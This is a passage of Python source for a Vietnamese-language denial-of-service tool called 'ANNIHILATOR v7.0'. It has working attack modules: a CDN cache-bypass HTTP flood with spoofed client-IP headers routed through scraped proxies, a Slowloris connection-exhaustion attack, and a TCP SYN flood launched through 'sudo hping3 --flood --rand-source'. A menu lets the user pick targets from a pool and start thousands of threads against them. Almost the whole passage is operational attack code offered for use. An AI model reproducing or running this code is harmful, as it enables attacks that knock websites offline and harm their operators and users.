            except:
                with self.lock:
                    self.fail += 1
                    self.counter += 1
                continue

# ============================================
# VERCEL / CACHE BYPASS
# ============================================
class VercelCacheBypass(AttackBase):
    def start(self, threads=VERCEL_BYPASS_THREADS + CACHE_BYPASS_THREADS):
        self.running = True
        print(f"{Cl.C}[*] VERCEL/CACHE BYPASS: {threads} luồng...{Cl.RESET}")
        for i in range(threads):
            t = threading.Thread(target=self.worker, daemon=True)
            t.start()
            if i % 500 == 0:
                time.sleep(0.005)
    
    def worker(self):
        while self.running:
            try:
                proxy = self.pm.get_random_proxy()
                target = random.choice(self.urls)
                # Cache buster cực mạnh
                params = {
                    "_vercel_no_cache": random.randint(100000000, 999999999),
                    "_rsc": random.choice(["1", "0", "true", "false"]),
                    "_next": random.randint(100000, 999999),
                    "buildId": hashlib.md5(os.urandom(16)).hexdigest(),
                    "ts": int(time.time() * 1000),
                    "rand": hashlib.sha256(os.urandom(32)).hexdigest()[:20],
                }
                for _ in range(random.randint(5, 20)):
                    params[hashlib.md5(os.urandom(8)).hexdigest()[:8]] = hashlib.md5(os.urandom(16)).hexdigest()
                url = target + "?" + urlencode(params)
                headers = {
                    "User-Agent": random.choice(USER_AGENTS),
                    "Accept": "text/x-component,text/html,*/*",
                    "Accept-Encoding": "gzip, deflate, br",
                    "X-Vercel-Id": hashlib.md5(os.urandom(16)).hexdigest(),
                    "X-Vercel-Cache": "BYPASS",
                    "X-Vercel-Skip-Cache": "1",
                    "Cache-Control": "no-cache, no-store, must-revalidate, max-age=0",
                    "Pragma": "no-cache",
                    "CDN-Cache-Control": "no-cache",
                    "Surrogate-Control": "no-store",
                    "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "True-Client-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "CF-Connecting-IP": f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}",
                    "X-Edge-Request-Id": hashlib.sha256(os.urandom(32)).hexdigest(),
                }
                method = random.choice(["GET", "POST", "HEAD", "OPTIONS", "PATCH", "PUT", "DELETE"])
                if method in ["POST", "PUT", "PATCH"]:
                    body = os.urandom(random.randint(1024, 1024*500))
                    response = requests.request(method, url, headers=headers, data=body, proxies=proxy, timeout=10, verify=False)
                else:
                    response = requests.request(method, url, headers=headers, proxies=proxy, timeout=10, verify=False, stream=True)
                    response.content[:4096]
                with self.lock:
                    self.counter += 1
                    self.success += 1
                    if self.counter % 3000 == 0:
                        print(f"\r{Cl.C}[BYPASS] {self.counter} yêu cầu | OK: {self.success}{Cl.RESET}", end="")
            except:
                with self.lock:
                    self.fail += 1
                pass

# ============================================
# SLOWLORIS
# ============================================
class SlowlorisAttack(AttackBase):
    def __init__(self, *args):
        super().__init__(*args)
        self.sockets = []
    
    def start(self, threads=SLOWLORIS_THREADS):
        self.running = True
        print(f"{Cl.R}[*] SLOWLORIS: {threads} luồng...{Cl.RESET}")
        for i in range(threads):
            t = threading.Thread(target=self.worker, daemon=True)
            t.start()
            time.sleep(0.005)
    
    def worker(self):
        host = random.choice(self.hosts)
        sockets = []
        for _ in range(50):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(4)
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                ssl_sock = ctx.wrap_socket(sock, server_hostname=host)
                ssl_sock.connect((host, TARGET_PORT))
                path = random.choice(["/", "/getkey", "/download", "/api/", "/login.php", "/index.html", "/dll_download.php"])
                req = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(USER_AGENTS)}\r\nAccept: */*\r\nConnection: keep-alive\r\nX-Random: {os.urandom(random.randint(500,2000)).hex()}\r\n"
                ssl_sock.send(req.encode())
                sockets.append(ssl_sock)
            except:
                pass
        self.sockets.extend(sockets)
        while self.running:
            for i, s in enumerate(sockets):
                try:
                    s.send(f"X-Keep-{random.randint(1,9999)}: {os.urandom(random.randint(500,3000)).hex()}\r\n".encode())
                    if random.random() < 0.4:
                        s.send(b"Keep-Alive: timeout=999, max=999\r\n")
                    time.sleep(random.uniform(3, 10))
                except:
                    try:
                        s.close()
                    except:
                        pass
                    try:
                        new_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                        new_sock.settimeout(4)
                        ctx = ssl.create_default_context()
                        ctx.check_hostname = False
                        ctx.verify_mode = ssl.CERT_NONE
                        ssl_new = ctx.wrap_socket(new_sock, server_hostname=host)
                        ssl_new.connect((host, TARGET_PORT))
                        ssl_new.send(req.encode())
                        sockets[i] = ssl_new
                    except:
                        sockets[i] = None
            sockets = [s for s in sockets if s is not None]
    
    def stop(self):
        self.running = False
        for s in self.sockets:
            try:
                s.close()
            except:
                pass

# ============================================
# TCP SYN FLOOD
# ============================================
class TCPSynFlood:
    def __init__(self):
        self.processes = []
        self.running = False
    
    def start_flood(self, hosts):
        self.running = True
        print(f"\n{Cl.BG_Y}{Cl.BOLD}[*] TCP SYN FLOOD: Đang khởi động...{Cl.RESET}")
        for host in hosts:
            try:
                subprocess.run(["which", "hping3"], capture_output=True, check=True)
                cmd = ["sudo", "hping3", "-S", "-p", "443", "--flood", "--rand-source", host]
                proc = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                self.processes.append(proc)
                print(f"{Cl.BG_G}[+] TCP SYN FLOOD đã bắt đầu cho {host}{Cl.RESET}")
            except:
                print(f"{Cl.Y}[-] Không thể chạy hping3 cho {host} (cần: sudo apt install hping3){Cl.RESET}")
    
    def stop_flood(self):
        self.running = False
        for proc in self.processes:
            try:
                proc.terminate()
            except:
                pass
        self.processes = []

# ============================================
# HÀM IN BANNER ĐẸP
# ============================================
def print_banner():
    banner = f"""
{Cl.BG_R}{Cl.BOLD}{Cl.W}  ╔══════════════════════════════════════════════════════════════════╗  {Cl.RESET}
{Cl.BG_R}{Cl.BOLD}{Cl.W}  ║  █████╗ ███╗   ██╗███╗   ██╗██╗██╗  ██╗██╗██╗      █████╗ ████████╗ ██████╗ ██████╗   ║  {Cl.RESET}
{Cl.BG_R}{Cl.BOLD}{Cl.W}  ║ ██╔══██╗████╗  ██║████╗  ██║██║██║  ██║██║██║     ██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗  ║  {Cl.RESET}
{Cl.BG_R}{Cl.BOLD}{Cl.W}  ║ ███████║██╔██╗ ██║██╔██╗ ██║██║███████║██║██║     ███████║   ██║   ██║   ██║██████╔╝  ║  {Cl.RESET}
{Cl.BG_R}{Cl.BOLD}{Cl.W}  ║ ██╔══██║██║╚██╗██║██║╚██╗██║██║██╔══██║██║██║     ██╔══██║   ██║   ██║   ██║██╔══██╗  ║  {Cl.RESET}
{Cl.BG_R}{Cl.BOLD}{Cl.W}  ║ ██║  ██║██║ ╚████║██║ ╚████║██║██║  ██║██║███████╗██║  ██║   ██║   ╚██████╔╝██║  ██║  ║  {Cl.RESET}
{Cl.BG_R}{Cl.BOLD}{Cl.W}  ║ ╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═══╝╚═╝╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝  ║  {Cl.RESET}
{Cl.BG_R}{Cl.BOLD}{Cl.W}  ╠══════════════════════════════════════════════════════════════════╣  {Cl.RESET}
{Cl.BG_R}{Cl.BOLD}{Cl.W}  ║  PHIÊN BẢN 7.0 VIETNAM | CHỌN MỤC TIÊU | SIÊU TẤN CÔNG | AUTO RESTART ║  {Cl.RESET}
{Cl.BG_R}{Cl.BOLD}{Cl.W}  ║  {len(HTTP_METHODS)} METHODS | {len(PROXY_SOURCES)} PROXY SOURCES | {len(CONTENT_TYPES)} CONTENT TYPES          ║  {Cl.RESET}
{Cl.BG_R}{Cl.BOLD}{Cl.W}  ╚══════════════════════════════════════════════════════════════════╝  {Cl.RESET}
"""
    print(banner)

# ============================================
# HÀM KHỞI ĐỘNG TẤN CÔNG
# ============================================
def launch_attack(proxy_manager, target_keys):
    hosts = []
    urls = []
    names = []
    for k in target_keys:
        if k in TARGET_POOL:
            hosts.extend(TARGET_POOL[k]["hosts"])
            urls.extend(TARGET_POOL[k]["urls"])
            names.append(TARGET_POOL[k]["name"])
    
    if not hosts:
        print(f"{Cl.R}[-] Không có mục tiêu nào được chọn!{Cl.RESET}")
        return
    
    print(f"\n{Cl.BOLD}{Cl.G}╔══════════════════════════════════════════╗{Cl.RESET}")
    print(f"{Cl.BOLD}{Cl.G}║  MỤC TIÊU: {', '.join(names):<30} ║{Cl.RESET}")
    print(f"{Cl.BOLD}{Cl.G}║  URLS: {len(urls)} | HOSTS: {len(set(hosts))}                            ║{Cl.RESET}")
    total_threads = HTTP_FLOOD_THREADS + POST_FLOOD_THREADS + RANDOM_METHOD_THREADS + VERCEL_BYPASS_THREADS + CACHE_BYPASS_THREADS + SLOWLORIS_THREADS
    print(f"{Cl.BOLD}{Cl.G}║  TỔNG LUỒNG: {total_threads}                          ║{Cl.RESET}")
    print(f"{Cl.BOLD}{Cl.G}╚══════════════════════════════════════════╝{Cl.RESET}")
    
    animate_loading("Đang khởi tạo module tấn công", 1.5)
    
    # Khởi động animation nền
    anim_thread = threading.Thread(target=animate_attack_status, daemon=True)
    anim_thread.start()
    
    # Khởi tạo các cuộc tấn công
    attacks = []
    
    http_flood = HTTPFlood(proxy_manager, hosts, urls)
    http_flood.start()
    attacks.append(http_flood)
    
    post_flood = PostFlood(proxy_manager, hosts, urls)
    post_flood.start()
    attacks.append(post_flood)
    
    ultra = UltraRandomAttack(proxy_manager, hosts, urls)
    ultra.start()
    attacks.append(ultra)
    
    bypass = VercelCacheBypass(proxy_manager, hosts, urls)
    bypass.start()
    attacks.append(bypass)
    
    slow = SlowlorisAttack(proxy_manager, hosts, urls)
    slow.start()
    attacks.append(slow)
    
    syn_flood = None
    if TCP_SYN_FLOOD:
        syn_flood = TCPSynFlood()
        syn_flood.start_flood(list(set(hosts)))
    
    print(f"\n{Cl.BOLD}{Cl.R}{'='*60}{Cl.RESET}")
    print(f"{Cl.BOLD}{Cl.R}  [⚡] ĐANG TẤN CÔNG! Nhấn ENTER để dừng  {Cl.RESET}")
    print(f"{Cl.BOLD}{Cl.R}{'='*60}{Cl.RESET}")
    input()
    
    # Dừng tất cả
    for att in attacks:
        if hasattr(att, 'running'):
            att.running = False
    if hasattr(slow, 'stop'):
        slow.stop()
    if syn_flood:
        syn_flood.stop_flood()
    
    print(f"\n{Cl.G}[✓] Đã dừng tất cả cuộc tấn công{Cl.RESET}")

# ============================================
# MENU CHÍNH
# ============================================
def main_menu():
    global current_proxy_manager
    proxy_manager = ProxyManager()
    current_proxy_manager = proxy_manager
    current_targets = []
    
    while True:
        print(f"\n{Cl.BOLD}{Cl.W}{'='*60}{Cl.RESET}")
        print(f"{Cl.BOLD}{Cl.W}         MENU CHÍNH - ANNIHILATOR v7.0{Cl.RESET}")
        print(f"{Cl.BOLD}{Cl.W}{'='*60}{Cl.RESET}")
        print(f"{Cl.C}[1]{Cl.RESET} Quét proxy từ {len(PROXY_SOURCES)} nguồn online")
        print(f"{Cl.C}[2]{Cl.RESET} Kiểm tra proxy live từ {PROXY_FILE}")
        print(f"{Cl.C}[3]{Cl.RESET} Quét + Kiểm tra proxy (tự động)")
        print(f"{Cl.C}[4]{Cl.RESET} Xem danh sách proxy live hiện tại")
        print(f"{Cl.Y}[5]{Cl.RESET} {Cl.BOLD}CHỌN MỤC TIÊU ĐỂ TẤN CÔNG{Cl.RESET}")
        print(f"{Cl.R}[6]{Cl.RESET} {Cl.BOLD}BẮT ĐẦU TẤN CÔNG (vào mục tiêu đã chọn){Cl.RESET}")
        print(f"{Cl.C}[7]{Cl.RESET} Thoát")
        print(f"{Cl.BOLD}{Cl.W}{'='*60}{Cl.RESET}")
        if current_targets:
            print(f"{Cl.G}[*] Mục tiêu đã chọn: {', '.join(TARGET_POOL[k]['name'] for k in current_targets)}{Cl.RESET}")
        else:
            print(f"{Cl.Y}[*] Chưa chọn mục tiêu nào. Hãy chọn [5] trước!{Cl.RESET}")
        print(f"{Cl.BOLD}{Cl.W}{'='*60}{Cl.RESET}")
        
        choice = input(f"\n{Cl.C}[?] Chọn chức năng (1-7): {Cl.RESET}").strip()
        
        if choice == "1":
            proxy_manager.scan_all_sources()
        elif choice == "2":
            if os.path.exists(PROXY_FILE):
                with open(PROXY_FILE, "r") as f:
                    proxies = [line.strip() for line in f if line.strip()]
                print(f"{Cl.G}[+] Đã tải {len(proxies)} proxy từ {PROXY_FILE}{Cl.RESET}")
                proxy_manager.check_all_proxies(proxies)
            else:
                print(f"{Cl.R}[-] File {PROXY_FILE} không tồn tại! Chọn [1] trước{Cl.RESET}")
        elif choice == "3":
            proxies = proxy_manager.scan_all_sources()
            proxy_manager.check_all_proxies(proxies)
        elif choice == "4":
            live_proxies = proxy_manager.reload_live_proxies()
            print(f"\n{Cl.G}[+] Tổng proxy live: {len(live_proxies)}{Cl.RESET}")
            if live_proxies:
                print(f"{Cl.C}[+] 10 proxy mẫu:{Cl.RESET}")
                for proxy in live_proxies[:10]:
                    print(f"    - {Cl.W}{proxy}{Cl.RESET}")
        elif choice == "5":
            print(f"\n{Cl.BOLD}{Cl.Y}═══ DANH SÁCH MỤC TIÊU ═══{Cl.RESET}")
            for k, v in TARGET_POOL.items():
                print(f"  {Cl.G}[{k}]{Cl.RESET} {Cl.W}{v['name']}{Cl.RESET} ({len(v['urls'])} URLs)")
            print(f"{Cl.Y}──────────────────────────────{Cl.RESET}")
            sel = input(f"{Cl.C}[?] Nhập số mục tiêu (vd: 1,2,3 hoặc 1-4 hoặc all): {Cl.RESET}").strip().lower()
            
            selected = []
            if sel == "all":
                selected = list(TARGET_POOL.keys())
            elif "-" in sel:
                try:
                    parts = sel.split("-")
                    start, end = int(parts[0]), int(parts[1])
                    selected = [str(i) for i in range(start, end+1) if str(i) in TARGET_POOL]
                except:
                    pass
            else:
                selected = [x.strip() for x in sel.split(",") if x.strip() in TARGET_POOL]
            
            if selected:
                current_targets = selected
                print(f"{Cl.G}[✓] Đã chọn: {', '.join(TARGET_POOL[s]['name'] for s in selected)}{Cl.RESET}")
            else:
                print(f"{Cl.R}[-] Lựa chọn không hợp lệ!{Cl.RESET}")
        
        elif choice == "6":
            if not current_targets:
                print(f"{Cl.R}[-] CHƯA CHỌN MỤC TIÊU! Hãy chọn [5] trước{Cl.RESET}")
                continue
            proxy_manager.reload_live_proxies()
            if not proxy_manager.live_proxies:
                print(f"{Cl.R}[-] KHÔNG CÓ PROXY LIVE! Hãy chọn [3] trước{Cl.RESET}")
                continue
            launch_attack(proxy_manager, current_targets)
        
        elif choice == "7":
            if proxy_manager and proxy_manager.live_proxies:
                with open(PROXY_LIVE_FILE, "w") as f:
                    for p in proxy_manager.live_proxies:
                        f.write(p + "\n")
                print(f"{Cl.G}[+] Đã lưu {len(proxy_manager.live_proxies)} proxy live{Cl.RESET}")
            print(f"{Cl.Y}[!] Thoát...{Cl.RESET}")
            sys.exit(0)
        else:
            print(f"{Cl.R}[-] Lựa chọn không hợp lệ!{Cl.RESET}")

# ============================================
# KHỞI ĐỘNG
# ============================================
if __name__ == "__main__":
    print_banner()
    animate_loading("Đang khởi tạo hệ thống", 1.5)
    main_menu()
